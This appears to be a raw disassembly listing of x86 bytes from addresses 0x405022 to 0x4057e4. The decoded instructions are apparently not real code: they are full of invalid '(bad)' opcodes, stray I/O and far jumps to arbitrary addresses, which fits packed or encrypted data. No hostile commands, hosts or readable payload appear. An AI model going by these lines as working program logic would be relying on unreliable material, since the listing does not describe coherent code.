  405022:	xor    BYTE PTR ds:0x9c5053cc,al
  405028:	stos   DWORD PTR es:[edi],eax
  405029:	(bad)  
  40502a:	scas   eax,DWORD PTR es:[edi]
  40502b:	jmp    0xfe4aa95b
  405030:	jl     0x40504f
  405032:	ret    0xfc3
  405035:	ja     0x405048
  405037:	pop    es
  405038:	sbb    ah,BYTE PTR [eax+ebp*2-0x6e]
  40503c:	dec    edx
  40503d:	sbb    esp,DWORD PTR ds:0x1c9f3c2f
  405043:	xchg   esi,eax
  405044:	dec    edi
  405045:	inc    eax
  405046:	int3   
  405047:	xor    esp,esp
  405049:	fimul  WORD PTR [edx]
  40504b:	push   eax
  40504c:	xchg   DWORD PTR [edx+0x58e219b4],eax
  405052:	add    eax,0x6cfff3c2
  405057:	or     ah,dl
  405059:	or     ch,BYTE PTR [ebx+ebp*4]
  40505c:	lods   al,BYTE PTR ds:[esi]
  40505d:	mov    al,0x7
  40505f:	rol    DWORD PTR [edi],cl
  405061:	mov    ds:0x89a89947,al
  405066:	aam    0xd9
  405068:	push   0x76
  40506a:	mov    DWORD PTR [esi],ebx
  40506c:	cs xor al,0x87
  40506f:	cdq    
  405070:	mov    bl,bl
  405072:	retf   
  405073:	or     al,0x5f
  405075:	adc    DWORD PTR [edx],eax
  405077:	push   esi
  405078:	pusha  
  405079:	out    0xba,eax
  40507b:	xchg   ebx,eax
  40507c:	outs   dx,DWORD PTR ds:[esi]
  40507d:	lods   eax,DWORD PTR ds:[esi]
  40507e:	mov    dh,0xb8
  405080:	mov    dh,0x2d
  405082:	clc    
  405083:	adc    bl,ah
  405085:	retf   0xa6d9
  405088:	sub    esp,eax
  40508a:	or     al,BYTE PTR [ebx-0x1bc02937]
  405090:	xor    bh,bh
  405092:	inc    edx
  405093:	mov    bh,0xda
  405095:	inc    edx
  405096:	pusha  
  405097:	clc    
  405098:	mov    al,ds:0x4062f15a
  40509d:	lea    esp,ds:[eax+0xf1c3af9]
  4050a4:	retf   
  4050a5:	arpl   cx,bx
  4050a7:	into   
  4050a8:	mov    eax,0x90254202
  4050ad:	je     0x4050b7
  4050af:	mov    ah,0xe2
  4050b1:	pop    ebx
  4050b2:	mov    edi,0x781692f5
  4050b7:	and    DWORD PTR [esi],ebx
  4050b9:	fcmovnbe st,st(2)
  4050bb:	xor    eax,0x83979f4e
  4050c0:	jb     0x40508a
  4050c2:	scas   al,BYTE PTR es:[edi]
  4050c3:	cmp    DWORD PTR [eax-0x1a],ebx
  4050c6:	xchg   esi,eax
  4050c7:	add    ebp,eax
  4050c9:	fwait
  4050ca:	cmp    esp,DWORD PTR [esi]
  4050cc:	fxsave ds:0x76863fcf
  4050d3:	(bad)  
  4050d4:	dec    eax
  4050d5:	popf   
  4050d6:	daa    
  4050d7:	cmp    dh,BYTE PTR [edi+eiz*2]
  4050da:	adc    eax,0x55570f25
  4050df:	je     0x405127
  4050e1:	xor    esp,DWORD PTR [esp+ebx*8]
  4050e4:	xor    ah,BYTE PTR gs:[ebx]
  4050e7:	sub    al,0x1a
  4050e9:	or     al,0x97
  4050eb:	leave  
  4050ec:	pop    ds
  4050ed:	fnstsw ax
  4050ef:	jnp    0x4050d4
  4050f1:	sbb    al,0xbc
  4050f3:	mov    ch,0x78
  4050f5:	aad    0x5f
  4050f7:	leave  
  4050f8:	test   BYTE PTR [ebx],bl
  4050fa:	jnp    0x405144
  4050fc:	leave  
  4050fd:	push   eax
  4050fe:	mov    ebp,0xd69b92fe
  405103:	loopne 0x405134
  405105:	repz dec esp
  405107:	dec    ebx
  405108:	pop    ebp
  405109:	jbe    0x4050b0
  40510b:	mov    edi,0x8aac37cd
  405110:	jo     0x405133
  405112:	call   0x74104673
  405117:	sbb    al,0xd5
  405119:	sub    BYTE PTR [eax],dh
  40511b:	scas   al,BYTE PTR es:[edi]
  40511c:	fdiv   QWORD PTR [ecx-0x7e]
  40511f:	push   edx
  405120:	jns    0x4050cd
  405122:	out    0xf,eax
  405124:	ror    DWORD PTR [esi-0x77],0x6d
  405128:	push   ss
  405129:	pop    ss
  40512a:	inc    ebp
  40512b:	pop    esi
  40512c:	lahf   
  40512d:	int3   
  40512e:	sti    
  40512f:	mov    ds:0xd2e0ec3d,al
  405134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405135:	xchg   esp,eax
  405136:	ds cs dec edi
  405139:	jmp    0x68a8:0xf90ee08f
  405140:	outs   dx,BYTE PTR ds:[esi]
  405141:	repnz outs dx,BYTE PTR fs:[esi]
  405144:	jo     0x4050f4
  405146:	xor    al,0x8a
  405148:	jp     0x405104
  40514a:	call   0x6c74:0xaab183e9
  405151:	(bad)  
  405152:	mov    eax,0xe74095ec
  405157:	clc    
  405158:	xor    DWORD PTR [esi+0x43981aad],edx
  40515e:	mov    BYTE PTR [esp+ecx*1],dh
  405161:	mov    ah,0x8e
  405163:	cmp    al,0x5a
  405165:	inc    esi
  405166:	dec    esp
  405167:	rcr    esi,0x7a
  40516a:	push   ebx
  40516b:	inc    esi
  40516c:	or     ebp,DWORD PTR ds:0x20b5eca5
  405172:	(bad)  
  405173:	mov    eax,ds:0xb0cbb651
  405178:	(bad)  
  405179:	xor    al,0x8e
  40517b:	jp     0x4051e0
  40517d:	aad    0x7b
  40517f:	xchg   BYTE PTR [esp+edi*4],bl
  405182:	push   ebp
  405183:	dec    eax
  405184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405185:	rcl    esp,1
  405187:	out    0x54,al
  405189:	pop    ss
  40518a:	(bad)  
  40518b:	and    ah,BYTE PTR [edx]
  40518d:	mov    edi,0x71bd11dc
  405192:	and    ebx,DWORD PTR [edx+0x2da2cc1a]
  405198:	mov    bl,0xc6
  40519a:	pop    ds
  40519b:	imul   eax,DWORD PTR [eax+ecx*8+0x773c7dfd],0x6
  4051a3:	fisub  DWORD PTR [ecx]
  4051a5:	fnstenv [ebp+0x1a]
  4051a8:	popa   
  4051a9:	pop    ebp
  4051aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051ab:	cmp    al,0xb7
  4051ad:	mov    ebp,ss
  4051af:	jne    0x405197
  4051b1:	std    
  4051b2:	adc    dl,BYTE PTR [esi-0x51]
  4051b5:	mov    bl,0x9f
  4051b7:	xchg   edx,eax
  4051b8:	retf   
  4051b9:	adc    al,0xb7
  4051bb:	xchg   DWORD PTR [esi+0x3d435420],esi
  4051c1:	jg     0x4051b3
  4051c3:	andnps xmm6,XMMWORD PTR [ebx+0x573bdda4]
  4051ca:	fiadd  WORD PTR [esi+eiz*8]
  4051cd:	cs mov ebx,ss
  4051d0:	inc    ecx
  4051d1:	add    edi,eax
  4051d3:	or     al,0x12
  4051d5:	stos   BYTE PTR es:[di],al
  4051d7:	(bad)  
  4051d8:	cdq    
  4051d9:	mov    esp,0xd83df4aa
  4051de:	sub    BYTE PTR [ebp-0x431cecee],dl
  4051e4:	xchg   esp,eax
  4051e5:	ss push cs
  4051e7:	out    0x4,eax
  4051e9:	inc    eax
  4051ea:	and    al,0x6c
  4051ec:	das    
  4051ed:	pusha  
  4051ee:	(bad)  
  4051ef:	sti    
  4051f0:	cmp    eax,0x910e1503
  4051f5:	xlat   BYTE PTR ds:[ebx]
  4051f6:	mov    WORD PTR [edi+0x49],gs
  4051f9:	mov    eax,ds:0xdc19c316
  4051fe:	int    0x9d
  405200:	sti    
  405201:	cmp    al,0xf7
  405203:	xchg   ebp,eax
  405204:	scas   al,BYTE PTR es:[edi]
  405205:	pop    esp
  405206:	sbb    BYTE PTR [ecx+edi*1-0x4778c90b],bl
  40520d:	or     al,0x87
  40520f:	inc    edi
  405210:	sbb    al,0x4d
  405212:	adc    al,0x4c
  405215:	arpl   di,sp
  405217:	and    DWORD PTR [edx+ebp*2-0x11b04793],edx
  40521e:	cmc    
  40521f:	aam    0x3d
  405221:	fucom  st(4)
  405223:	pusha  
  405224:	mov    edx,0xe52c495
  405229:	add    DWORD PTR [ebp+0x5f11cb9a],ebp
  40522f:	mov    dh,0x76
  405231:	push   esp
  405232:	gs into 
  405234:	test   al,0x71
  405236:	gs inc ebp
  405238:	icebp  
  405239:	imul   edx,DWORD PTR [ebx+0x6eb32e5b],0x56b737d4
  405243:	xchg   ebx,eax
  405244:	lods   al,BYTE PTR ds:[esi]
  405245:	mov    bh,0x3b
  405247:	pop    eax
  405248:	out    dx,eax
  405249:	rol    BYTE PTR [edx+0x1a021c9f],cl
  40524f:	lods   al,BYTE PTR ds:[esi]
  405250:	je     0x405232
  405252:	and    BYTE PTR [edi],bh
  405254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405255:	pop    ecx
  405256:	scas   eax,DWORD PTR es:[edi]
  405257:	neg    BYTE PTR [edi+0x43]
  40525a:	cmp    ecx,DWORD PTR [ebp+0x1ac2ca94]
  405260:	jo     0x4051e5
  405262:	pop    esp
  405263:	push   eax
  405264:	push   ebp
  405265:	stos   BYTE PTR es:[edi],al
  405266:	pop    esp
  405267:	push   ebx
  405268:	add    al,0xd5
  40526a:	and    BYTE PTR [edi],cl
  40526c:	mov    edx,0x55574937
  405271:	imul   ebx,DWORD PTR [edi+0x27],0xca2a39db
  405278:	mov    ds:0xc0775bb8,al
  40527d:	adc    BYTE PTR [ebp+0x2461370f],bh
  405283:	sub    al,0x59
  405285:	push   0xffffffa4
  405287:	call   FWORD PTR [ebx]
  405289:	(bad)  
  40528a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40528b:	shl    DWORD PTR [eax-0x30],cl
  40528e:	clc    
  40528f:	scas   eax,DWORD PTR es:[edi]
  405290:	mov    eax,0xc1aff932
  405295:	std    
  405296:	cs ja  0x40527c
  405299:	lea    ecx,[ecx+0x13]
  40529c:	test   eax,0xd180825
  4052a1:	jbe    0x40524b
  4052a3:	pop    edi
  4052a4:	js     0x405281
  4052a6:	ret    
  4052a7:	sar    BYTE PTR [bp+di+0x114],1
  4052ac:	sbb    eax,0x15458c70
  4052b1:	sbb    eax,0x6108dfe8
  4052b6:	mov    ecx,DWORD PTR [esi]
  4052b8:	or     ch,BYTE PTR [ecx-0x6039ea87]
  4052be:	std    
  4052bf:	ja     0x4052e4
  4052c1:	sbb    bl,BYTE PTR [esi+edi*4-0x20]
  4052c5:	ja     0x405313
  4052c7:	or     bh,BYTE PTR [ebx+0x20]
  4052ca:	aaa    
  4052cb:	xor    eax,0x86997b2b
  4052d0:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052d2:	jb     0x40530d
  4052d4:	lahf   
  4052d5:	pop    ebx
  4052d6:	fild   QWORD PTR [edx+esi*1+0x253c177d]
  4052dd:	leave  
  4052de:	cld    
  4052df:	retf   0x9344
  4052e2:	fs dec ebx
  4052e4:	xchg   DWORD PTR ss:[edi+0x45],edx
  4052e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052e9:	sub    eax,0x2891e856
  4052ee:	xor    DWORD PTR [edx+ecx*4-0x36],esi
  4052f2:	pop    ss
  4052f3:	add    dl,BYTE PTR [ecx+0x46cd7461]
  4052f9:	jo     0x4052b7
  4052fb:	add    ch,cl
  4052fd:	jg     0x40531c
  4052ff:	std    
  405300:	mov    esp,0xa4d6b749
  405305:	adc    BYTE PTR [eax+0x511f1634],0xbb
  40530c:	xchg   edi,eax
  40530d:	outs   dx,DWORD PTR ds:[esi]
  40530e:	push   0x639bb42a
  405313:	cmp    esp,esp
  405315:	push   esi
  405316:	pop    ss
  405317:	(bad)  
  405318:	iret   
  405319:	mov    esp,0x6e6f5e9c
  40531e:	push   esi
  40531f:	out    0x89,eax
  405321:	sbb    dl,bl
  405323:	enter  0xe92e,0x61
  405327:	or     ch,dh
  405329:	mov    ecx,0xaebf570e
  40532e:	push   es
  40532f:	inc    ecx
  405330:	retf   0x7db
  405333:	cmp    eax,0x3179d17b
  405338:	mov    fs,ebp
  40533a:	cs in  eax,0x24
  40533d:	aad    0xb3
  40533f:	dec    esi
  405340:	xchg   ecx,eax
  405341:	dec    esp
  405342:	jmp    0xe4514473
  405347:	test   cl,cl
  405349:	mov    edi,0xa90a2b8d
  40534e:	aam    0xbd
  405350:	pop    eax
  405351:	sbb    BYTE PTR [edx-0x33961eda],ch
  405357:	sbb    eax,0x820ef027
  40535c:	int    0x30
  40535e:	mov    eax,DWORD PTR [ecx+0x31a32bc4]
  405364:	(bad)  
  405365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405366:	mov    ds:0xaea039a7,eax
  40536b:	popa   
  40536c:	je     0x4053ec
  40536e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40536f:	cli    
  405370:	sbb    al,0x93
  405372:	add    al,0x60
  405374:	jmp    0xc0c9bac1
  405379:	jb     0x4053a8
  40537b:	jo     0x405316
  40537d:	push   ds
  40537e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40537f:	and    ah,bh
  405381:	retf   
  405382:	repnz aad 0x5d
  405385:	jne    0x4053c3
  405387:	repnz inc ax
  40538a:	or     al,BYTE PTR ds:0x72b15e29
  405390:	(bad)  
  405391:	push   ebx
  405392:	mov    esp,0xf572b8c6
  405397:	dec    ebp
  405398:	inc    ebp
  405399:	adc    ebx,DWORD PTR ds:0xadc35757
  40539f:	rcl    DWORD PTR [ecx],1
  4053a1:	cli    
  4053a2:	mov    edi,0x86707c4c
  4053a7:	out    dx,eax
  4053a8:	cmc    
  4053a9:	ja     0x405376
  4053ab:	jne    0x405397
  4053ad:	ds jp  0x4053ff
  4053b0:	out    dx,al
  4053b1:	gs inc edi
  4053b3:	lods   eax,DWORD PTR ds:[esi]
  4053b4:	ret    0x732
  4053b7:	je     0x40538f
  4053b9:	cmp    bh,ch
  4053bb:	retf   
  4053bc:	add    cl,BYTE PTR [ebp-0x1]
  4053bf:	les    ebp,FWORD PTR [ecx-0x28365a4d]
  4053c5:	(bad)  
  4053c6:	push   ds
  4053c7:	xchg   edi,eax
  4053c8:	fwait
  4053c9:	(bad)  
  4053ca:	in     al,dx
  4053cb:	ds xor eax,0x90d54114
  4053d1:	sbb    al,0x28
  4053d3:	inc    edi
  4053d4:	sub    ch,BYTE PTR [edi]
  4053d6:	jns    0x4053cc
  4053d8:	mov    es,esp
  4053da:	or     BYTE PTR [ecx+0x3491861e],dl
  4053e0:	xchg   BYTE PTR [edi-0x5c7c958],bl
  4053e6:	xor    ah,BYTE PTR [ecx+0x60]
  4053e9:	dec    ecx
  4053ea:	sbb    al,0x47
  4053ec:	adc    al,cl
  4053ee:	or     eax,0x31c3576
  4053f3:	leave  
  4053f4:	jb     0x405397
  4053f6:	push   ebx
  4053f7:	inc    ecx
  4053f8:	pop    edx
  4053f9:	mov    eax,0x773be368
  4053fe:	xchg   ecx,eax
  4053ff:	jne    0x40541f
  405401:	xchg   esp,eax
  405402:	dec    esp
  405403:	cld    
  405404:	add    al,0x88
  405406:	sub    BYTE PTR [eax+ecx*1-0x8],al
  40540a:	retf   
  40540b:	xor    ebx,DWORD PTR [ecx+0xd3ae069]
  405411:	xor    DWORD PTR [edi],ebx
  405413:	pop    eax
  405414:	mov    al,0x1c
  405416:	aam    0xde
  405418:	push   ss
  405419:	jecxz  0x405480
  40541b:	xchg   bh,cl
  40541d:	mov    ecx,DWORD PTR [eax]
  40541f:	jge    0x4053fd
  405421:	push   edx
  405422:	mov    ebp,0xcfcfd32d
  405427:	fist   WORD PTR [edi]
  405429:	iret   
  40542a:	and    al,0x53
  40542c:	push   ss
  40542d:	pop    edi
  40542e:	(bad)  [esi]
  405430:	sti    
  405431:	jae    0x4053f3
  405433:	dec    ecx
  405434:	in     eax,dx
  405435:	jae    0x405405
  405437:	mov    al,ds:0x168b0dfc
  40543c:	adc    eax,0xc418c5cd
  405441:	inc    ebp
  405442:	fistp  WORD PTR [ebp+0x67628835]
  405448:	sar    DWORD PTR ds:0xc22224fb,0xc6
  40544f:	in     al,0x0
  405451:	xor    dl,bh
  405453:	jnp    0x4054b7
  405455:	ror    eax,1
  405457:	hlt    
  405458:	jle    0x405446
  40545a:	out    0x7c,al
  40545c:	push   esi
  40545d:	pop    eax
  40545e:	xchg   esi,eax
  40545f:	(bad)  
  405460:	xor    edx,DWORD PTR ds:0xcf355794
  405466:	outs   dx,BYTE PTR ds:[esi]
  405467:	in     al,dx
  405468:	mov    WORD PTR [edx+0x18fcffaa],gs
  40546e:	pusha  
  40546f:	xlat   BYTE PTR ds:[ebx]
  405470:	and    ah,BYTE PTR [esi-0x7]
  405473:	and    eax,0xc13040b8
  405478:	xchg   edx,eax
  405479:	loope  0x405438
  40547b:	outs   dx,BYTE PTR ds:[esi]
  40547c:	pop    edi
  40547d:	rcr    esp,cl
  40547f:	dec    esi
  405480:	clc    
  405481:	outs   dx,BYTE PTR ds:[esi]
  405482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405483:	adc    al,0x61
  405485:	or     ch,BYTE PTR [edx]
  405487:	scas   al,BYTE PTR es:[edi]
  405488:	into   
  405489:	cwde   
  40548a:	cmp    ebp,DWORD PTR ds:0x741743d3
  405490:	enter  0x8e2a,0x96
  405494:	mov    es,esi
  405496:	jne    0x40549a
  405498:	gs inc ebp
  40549a:	or     BYTE PTR ds:0xb8356b84,ch
  4054a0:	jg     0x4054f3
  4054a2:	push   ss
  4054a3:	stos   BYTE PTR es:[edi],al
  4054a4:	sub    bl,0x7c
  4054a7:	sub    BYTE PTR [edx],cl
  4054a9:	mov    bh,0x45
  4054ab:	jl     0x4054d3
  4054ad:	push   es
  4054ae:	jge    0x4054ee
  4054b0:	mov    eax,0xea3607de
  4054b5:	shl    dh,1
  4054b7:	xchg   edx,eax
  4054b8:	shl    al,1
  4054ba:	in     al,0xc7
  4054bc:	inc    edi
  4054bd:	add    ebp,DWORD PTR [ebx-0x4f]
  4054c0:	push   ss
  4054c1:	test   BYTE PTR [edx],0x3d
  4054c4:	jnp    0x405526
  4054c6:	mov    bl,0xed
  4054c8:	pop    edi
  4054c9:	add    ecx,DWORD PTR [eax-0x55ffc486]
  4054cf:	mov    dl,0xc9
  4054d1:	cmp    dl,bh
  4054d3:	cmp    bl,BYTE PTR [esp+ebp*8]
  4054d6:	lods   eax,DWORD PTR ds:[esi]
  4054d7:	mov    eax,0xce32b466
  4054dc:	and    edi,ebp
  4054de:	dec    edi
  4054df:	shl    BYTE PTR [edi-0x16],1
  4054e2:	aad    0x4b
  4054e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054e5:	jl     0x4054b8
  4054e7:	sbb    eax,0xa423d54c
  4054ec:	jmp    0xaba7:0x7f35b48
  4054f3:	cmp    BYTE PTR [ebx],bl
  4054f5:	leave  
  4054f6:	mov    gs,WORD PTR [esp+ebx*1-0x513cc32c]
  4054fd:	outs   dx,BYTE PTR ss:[esi]
  4054ff:	dec    edx
  405500:	inc    ebx
  405501:	push   ebp
  405502:	out    0xe1,eax
  405504:	xor    DWORD PTR [eax],esi
  405506:	adc    BYTE PTR [esi-0x28fa228e],dh
  40550c:	or     eax,esi
  40550e:	lds    ebp,FWORD PTR [ebx+0x429bf777]
  405514:	pop    ecx
  405515:	mov    dh,0x2
  405517:	fidivr DWORD PTR [ebp-0x350ce700]
  40551d:	retf   0xfdc3
  405520:	pop    esp
  405521:	mov    eax,ds:0x8172b857
  405526:	test   DWORD PTR [ebp-0x4b],esi
  405529:	sbb    DWORD PTR [ebx],eax
  40552b:	jnp    0x40550b
  40552d:	cmp    esp,DWORD PTR [edx-0x48]
  405530:	mov    BYTE PTR [ebx],cl
  405532:	arpl   WORD PTR [ebx-0x47dee9d5],dx
  405538:	je     0x405568
  40553a:	test   al,0x8e
  40553c:	sub    eax,0xa295a97a
  405541:	sub    al,0x0
  405543:	dec    edi
  405544:	jmp    0x6318:0xb94f676c
  40554b:	mov    esi,DWORD PTR [esi+0x1abbf316]
  405551:	xchg   BYTE PTR [ecx],dh
  405553:	bndstx [eax-0x5bcacd7e],(bad)
  40555a:	test   al,0x5d
  40555c:	sahf   
  40555d:	mov    BYTE PTR [ebx],al
  40555f:	enter  0x1bfc,0x59
  405563:	outs   dx,BYTE PTR ds:[esi]
  405564:	lea    esi,[eax-0x50]
  405567:	lock jmp 0xba3a5a32
  40556d:	mov    esp,DWORD PTR [ecx-0x23]
  405570:	jns    0x405594
  405572:	aaa    
  405573:	shl    BYTE PTR ds:0xa0edfd57,1
  405579:	in     al,0x0
  40557b:	out    0x8e,eax
  40557d:	dec    eax
  40557e:	xor    BYTE PTR [ecx+0x58d325cd],ch
  405584:	pop    ss
  405585:	pusha  
  405586:	rcr    DWORD PTR [ebx-0x5b],0xc1
  40558a:	pop    esp
  40558b:	dec    esi
  40558c:	je     0x40550f
  40558e:	(bad)  
  40558f:	call   0x7375a897
  405594:	pop    eax
  405595:	cdq    
  405596:	leave  
  405597:	xchg   ebx,eax
  405598:	imul   ecx,DWORD PTR [ebp-0x20],0x47b2b60d
  40559f:	(bad)  
  4055a0:	call   0xd60daedf
  4055a5:	pop    edx
  4055a6:	iret   
  4055a7:	nop
  4055a8:	lds    ecx,FWORD PTR [ecx-0x12]
  4055ab:	enter  0x443d,0xf0
  4055af:	arpl   sp,si
  4055b1:	jb     0x405600
  4055b3:	out    0x87,al
  4055b5:	lahf   
  4055b6:	(bad)  
  4055b7:	jnp    0x4055dc
  4055b9:	adc    ah,BYTE PTR [edx]
  4055bb:	aaa    
  4055bc:	sub    BYTE PTR [eax-0x29],al
  4055bf:	push   edi
  4055c0:	dec    edi
  4055c1:	inc    esi
  4055c2:	xchg   ebx,eax
  4055c3:	xchg   esi,eax
  4055c4:	add    bl,ch
  4055c6:	rol    ah,0x91
  4055c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055ca:	sub    DWORD PTR [ecx-0x3a],ecx
  4055cd:	sub    BYTE PTR [eax-0x7d],0x72
  4055d1:	or     ah,BYTE PTR [eax-0x6cc2bb0f]
  4055d7:	or     eax,0x339ebed5
  4055dc:	fdivr  QWORD PTR [esp+edx*4-0x4d]
  4055e0:	enter  0xf799,0xf5
  4055e4:	sar    BYTE PTR [ebx-0x68f5715a],0xe8
  4055eb:	out    dx,eax
  4055ec:	jns    0x4055be
  4055ee:	stc    
  4055ef:	and    bl,BYTE PTR [eax-0x51287a4f]
  4055f5:	xchg   edx,eax
  4055f6:	loope  0x40557b
  4055f8:	xor    eax,0x793459c3
  4055fd:	dec    edx
  4055fe:	cmp    eax,0xa85f06fb
  405603:	js     0x40559d
  405605:	retf   0x5079
  405608:	mov    DWORD PTR [ebp-0x72],ebp
  40560b:	dec    ecx
  40560c:	fnstenv [esi]
  40560e:	push   0x7a230a02
  405613:	dec    esi
  405614:	or     eax,0x79d050d7
  405619:	scas   al,BYTE PTR es:[edi]
  40561a:	pusha  
  40561b:	add    bh,BYTE PTR [ebx-0x5c]
  40561e:	jp     0x405676
  405620:	outs   dx,BYTE PTR ds:[esi]
  405621:	jnp    0x40567a
  405623:	push   edx
  405624:	jg     0x405678
  405626:	ficomp WORD PTR [esi]
  405628:	dec    ecx
  405629:	and    dl,al
  40562b:	xchg   esp,eax
  40562c:	sub    ecx,DWORD PTR [ecx]
  40562e:	pop    esi
  40562f:	sbb    edx,esi
  405631:	sub    BYTE PTR [esp+ebx*8],dl
  405634:	mov    ch,0x6a
  405636:	jmp    0x5f185fef
  40563b:	jge    0x405617
  40563d:	sbb    DWORD PTR [ebx+0x54c9960],ecx
  405643:	push   ebp
  405644:	mov    DWORD PTR [ecx+eax*1+0x74],edi
  405648:	inc    ebx
  405649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564a:	pop    ebx
  40564b:	test   BYTE PTR [esi-0x35],bh
  40564e:	push   edi
  40564f:	jg     0x40561c
  405651:	adc    dh,dl
  405653:	mov    eax,0x6c6247ef
  405658:	inc    eax
  405659:	pop    ss
  40565a:	push   ss
  40565b:	push   ss
  40565c:	test   al,0x58
  40565e:	rcl    BYTE PTR [ebp+0x6e],0x3d
  405662:	jae    0x4056b0
  405664:	int    0x9e
  405666:	and    eax,0x423ed024
  40566b:	ucomiss xmm4,DWORD PTR [esi]
  40566e:	jae    0x405620
  405670:	(bad)  
  405671:	jbe    0x405644
  405673:	fsubp  st(4),st
  405675:	cmp    ch,ch
  405677:	mov    cs,WORD PTR [ecx+0x73fe34c9]
  40567d:	push   ds
  40567e:	ret    0xc500
  405681:	arpl   WORD PTR [ebx-0x6bfa3c36],bp
  405687:	adc    esp,esp
  405689:	hlt    
  40568a:	mov    ch,ch
  40568c:	out    dx,al
  40568d:	dec    edi
  40568e:	sbb    DWORD PTR [eax+0x3f],esp
  405691:	sub    dh,bl
  405693:	call   0x3390:0xdd258429
  40569a:	xchg   bh,bh
  40569c:	jl     0x405669
  40569e:	daa    
  40569f:	(bad)  
  4056a0:	jo     0x4056e6
  4056a2:	cli    
  4056a3:	mov    edi,DWORD PTR [ecx+0x6ddf4ee7]
  4056a9:	pop    ebp
  4056aa:	mov    ah,0x4
  4056ac:	gs out 0xe5,eax
  4056af:	adc    BYTE PTR [ebx+eax*2],ch
  4056b2:	das    
  4056b3:	fmul   QWORD PTR [edi+0x5a]
  4056b6:	outs   dx,BYTE PTR ds:[esi]
  4056b7:	pop    edi
  4056b8:	jbe    0x405700
  4056ba:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bc:	dec    ebx
  4056bd:	mov    al,fs:0xc33debfa
  4056c3:	fdiv   st,st(2)
  4056c5:	fsubr  QWORD PTR ds:[ecx+0x3abacea]
  4056cc:	jecxz  0x40570c
  4056ce:	clc    
  4056cf:	jne    0x40566f
  4056d1:	sub    ah,BYTE PTR [edi+0x2f]
  4056d4:	cwde   
  4056d5:	xor    cl,BYTE PTR [ecx+ecx*1]
  4056d8:	sbb    al,0xae
  4056da:	clc    
  4056db:	loope  0x405675
  4056dd:	aad    0x47
  4056df:	cs scas al,BYTE PTR es:[edi]
  4056e1:	mov    ah,0x71
  4056e3:	sbb    esp,DWORD PTR [edi+eax*4-0x73899694]
  4056ea:	test   DWORD PTR [edx],ecx
  4056ec:	inc    esp
  4056ed:	sbb    edi,0x2
  4056f0:	push   es
  4056f1:	lahf   
  4056f2:	ror    DWORD PTR [edx+0x31],1
  4056f5:	inc    edi
  4056f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f7:	xlat   BYTE PTR ds:[ebx]
  4056f8:	sbb    esp,DWORD PTR [ecx+0x56487a6c]
  4056fe:	fdiv   QWORD PTR [esi+eiz*8-0x4530948d]
  405705:	jbe    0x4056fe
  405707:	dec    edi
  405708:	add    eax,0x5365a6d2
  40570d:	adc    al,0x2
  40570f:	pop    ss
  405710:	push   0x7f6ee7a4
  405715:	les    esi,FWORD PTR [edi-0x5b]
  405718:	int3   
  405719:	sbb    al,0x4f
  40571b:	stc    
  40571c:	jbe    0x405758
  40571e:	add    esi,ecx
  405720:	fisubr DWORD PTR [esi-0x22930cf2]
  405726:	sub    DWORD PTR [ebx],0x559a7e47
  40572c:	xchg   ebx,eax
  40572d:	pop    eax
  40572e:	inc    edx
  40572f:	adc    al,0xb5
  405731:	addr16 (bad) 
  405733:	and    ebp,DWORD PTR [ebp-0x2cf53586]
  405739:	add    al,0xeb
  40573b:	mov    ds:0x4c246182,eax
  405740:	and    edx,DWORD PTR [esi]
  405742:	push   esp
  405743:	daa    
  405744:	mov    ch,0x7e
  405746:	mov    ch,0x9e
  405748:	aas    
  405749:	push   ebx
  40574a:	jb     0x4057b7
  40574c:	cmp    al,0x90
  40574e:	(bad)  
  40574f:	call   0xbf65a0fd
  405754:	pushfw 
  405756:	push   edx
  405757:	dec    ebp
  405758:	sar    esi,cl
  40575a:	mov    al,BYTE PTR [ebx-0x4889dab8]
  405760:	jb     0x40574c
  405762:	dec    ebp
  405763:	mov    fs,WORD PTR [ecx]
  405765:	enter  0xade2,0xb8
  405769:	sub    ebx,ecx
  40576b:	jb     0x4057a7
  40576d:	mov    ?,WORD PTR [esi-0x1c1581a0]
  405773:	jle    0x405711
  405775:	cmp    al,0xdb
  405777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405778:	imul   esi
  40577a:	shl    BYTE PTR [eax-0x7ed2be9f],cl
  405780:	ds push ebx
  405782:	inc    edx
  405783:	xor    ch,al
  405785:	ds jno 0x405751
  405788:	cmp    eax,0xbdac6408
  40578d:	inc    ebx
  40578e:	dec    edx
  40578f:	imul   eax,DWORD PTR [ebp+0x2faef8ae],0xfbc25323
  405799:	nop
  40579a:	sti    
  40579b:	jl     0x405806
  40579d:	xor    eax,ebp
  40579f:	fldenv [esi+0xbfbca4c]
  4057a5:	mov    DWORD PTR [edx+0x5ad1f661],edi
  4057ab:	mov    esp,0x21897812
  4057b0:	and    edi,edi
  4057b2:	sbb    DWORD PTR [ecx],edi
  4057b4:	fiadd  WORD PTR [ecx]
  4057b6:	ins    BYTE PTR es:[edi],dx
  4057b7:	int3   
  4057b8:	retf   0x92c8
  4057bb:	xchg   esi,edi
  4057bd:	mov    eax,0x50760430
  4057c2:	stc    
  4057c3:	jae    0x4057fa
  4057c5:	pop    ecx
  4057c6:	nop
  4057c7:	pop    ecx
  4057c8:	xchg   ecx,eax
  4057c9:	mov    dh,0x2
  4057cb:	jmp    0x405842
  4057cd:	test   esp,ecx
  4057cf:	sub    DWORD PTR [esi-0x3f757a2f],eax
  4057d5:	push   eax
  4057d6:	adc    DWORD PTR [edi-0x77],esp
  4057d9:	jg     0x40576e
  4057db:	xor    al,0x69
  4057dd:	mov    ebx,0x33bf6ad0
  4057e2:	scas   al,BYTE PTR es:[edi]
  4057e3:	outs   dx,DWORD PTR ds:[esi]
  4057e4:	iret   
